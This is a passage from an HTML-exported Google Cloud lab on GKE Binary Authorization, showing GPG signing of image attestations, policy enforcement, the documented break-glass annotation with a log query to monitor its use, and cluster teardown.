generated signature payload:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat "${GENERATED_PAYLOAD}"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>&quot;Sign&quot; the payload with the PGP key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gpg --local-user "${ATTESTOR_EMAIL}" \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --armor \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --output ${GENERATED_SIGNATURE} \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --sign ${GENERATED_PAYLOAD}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the generated signature (PGP message):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat "${GENERATED_SIGNATURE}"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create the attestation:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud beta container binauthz attestations create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --artifact-url="${IMAGE_PATH}@${IMAGE_DIGEST}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --attestor="projects/${PROJECT_ID}/attestors/${ATTESTOR}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --signature-file=${GENERATED_SIGNATURE} \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --public-key-id="${PGP_FINGERPRINT}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the newly created attestation:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud beta container binauthz attestations list \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --attestor="projects/${PROJECT_ID}/attestors/${ATTESTOR}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-11-running-an-image-with-attestation-enforcement-enabled'><span>Task 11. Running an image with attestation enforcement enabled</span></h2><p><span>The next step is to change the Binary Authorization policy to enforce that attestation is to be present on all images that do not match the allowlist pattern(s).</span></p><ol start='' ><li><p><span>To change the policy to require attestation, run the following and then copy the full path/name of the attestation authority:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "projects/${PROJECT_ID}/attestors/${ATTESTOR}" # Copy this output to your copy/paste buffer</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next, edit the Binary Authorization policy to </span><code>edit</code><span> the GKE Cluster specific rule.</span></p></li></ol><p><span>Click the three dots by your cluster name to </span><strong><span>Edit</span></strong><span> your cluster-specific rules.</span></p><ol start='' ><li><p><span>Select </span><code>Require attestations (Allow only images that have been verified by all of the following attestors)</code><span> instead of </span><code>Disallow all images</code><span> in the pop-up window.:</span></p></li></ol><p><img src="images\HXkk8WbGxIy16NT5N3n6%2BeDpiKBY8SrL6BmsIgBBGMQ%3D" referrerpolicy="no-referrer" alt="Edit Policy page with Disallow all images option selected"></p><ol start='' ><li><p><span>Next, click on </span><code>Add Attestors</code><span> followed by </span><code>Add by attestor resource ID</code><span>. Enter the contents of your copy/paste buffer in the format of </span><code>projects/${PROJECT_ID}/attestors/${ATTESTOR}</code><span>, then click </span><strong><span>Add 1 Attestor</span></strong><span>, and then click </span><strong><span>Submit</span></strong><span>, and finally click </span><strong><span>Save Policy</span></strong><span>.</span></p></li></ol><p><img src="images\Rpc6MdPXwJEl9tWyuUTzCc2opzI8vjY6j0F%2FWocOqxA%3D" referrerpolicy="no-referrer" alt="Edit GKE cluster-specific rule for us-central1-a.my-cluster-1 dialog box"></p><p><span>The default policy should still show </span><code>Disallow all images</code><span>, but the cluster-specific rule should be requiring attestation.</span></p><ol start='' ><li><p><span>Now, obtain the most recent SHA256 Digest of the signed image from the previous steps:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IMAGE_PATH="gcr.io/${PROJECT_ID}/nginx"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IMAGE_DIGEST="$(gcloud container images list-tags --format='get(digest)' $IMAGE_PATH | head -1)"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>After waiting at least 30 seconds from the time the Binary Authorization policy was updated, run the pod and verify success:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt; EOF | kubectl create -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: "${IMAGE_PATH}@${IMAGE_DIGEST}"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ports:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - containerPort: 80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Congratulations! You have now manually attested to a container image and enforced a policy for that image inside your GKE cluster.</span></p><h3 id='test-completed-task-6'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully updated Binary Authorization policy to modify cluster specific rule to allow only images that have been approved by attestors, you will see an assessment score.</span></p><p><span>Update BA policy to modify cluster specific rule to allow only images that have been approved by attestors</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><h2 id='task-12-handling-emergency-situations'><span>Task 12. Handling emergency situations</span></h2><p><span>From a user&#39;s perspective, the Binary Authorization policy may incorrectly block an image or there may be another issue with the successful operation of the admission controller webhook.</span></p><p><span>In this &quot;emergency&quot; case, there is a &quot;break glass&quot; capability that leverages a specific annotation to signal to the admission controller to run the pod and skip policy enforcement.</span></p><p><strong><span>Note:</span></strong><span> You will want to notify a security team when this occurs as this can be leveraged by malicious users if they have the ability to create a pod.</span></p><p><span>In this case, though, your response procedures can be started within seconds of the activity occurring. The logs are available in Stackdriver:</span></p><ol start='' ><li><p><span>To run an unsigned </span><code>nginx</code><span> container with the &quot;break glass&quot; annotation, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt; EOF | kubectl create -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: nginx-alpha</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  annotations:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  alpha.image-policy.k8s.io/break-glass: "true"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: "nginx:latest"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ports:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - containerPort: 80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 315px;"></div><div class="CodeMirror-gutters" style="display: none; height: 315px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the Google Cloud console, navigate to the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Logging</span></strong><span> &gt; </span><strong><span>Logs Explorer</span></strong><span> page.</span></p></li><li><p><span>Populate the </span><strong><span>Query builder</span></strong><span> box with below and then Click </span><strong><span>Run Query</span></strong><span>:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type="k8s_cluster" protoPayload.request.metadata.annotations."alpha.image-policy.k8s.io/break-glass"="true"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p></li><li><p><span>You should see events when the admission controller allowed a pod due to the annotation being present. From this filter, you can create a </span><code>Sink</code><span> which sends logs that match this filter to an external destination.</span></p></li></ol><p><img src="images\uluTLrI3yZVnyVhBZaRFFmubQbJDW38Nfp2Bii0RgMM%3D" referrerpolicy="no-referrer" alt="Query builder text box with populated code"></p><p><strong><span>Note:</span></strong><span> Wait for atleast 5 to 10 minutes for the logs to appear.</span></p><h2 id='task-13-tear-down'><span>Task 13. Tear down</span></h2><p><span>Qwiklabs will remove all resources you created for this lab, but it&#39;s good to know how to clean up your own environment.</span></p><ol start='' ><li><p><span>The following script will destroy the Kubernetes Engine cluster:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./delete.sh -c my-cluster-1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If you created your own cluster name at the beginning of the lab, use that name. In this example the name </span><code>my-cluster-1</code><span> was used.</span></p><p><span>The last lines of the output will be:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Deleting cluster</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Cluster delete command is being run asynchronously and will take a few moments to be removed. Use the </span><strong><span>Cloud Console UI</span></strong><span> or </span><code>gcloud container clusters list</code><span> command to track the progress if desired. Wait until cluster get removed.</span></p><h3 id='test-completed-task-7'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully deleted your cluster, you will see an assessment score.</span></p><p><span>Tear Down (delete cluster)</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><span>The following commands will remove the remaining resources.</span></p><ol start='' ><li><p><span>Delete the container image that was pushed to GCR:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: 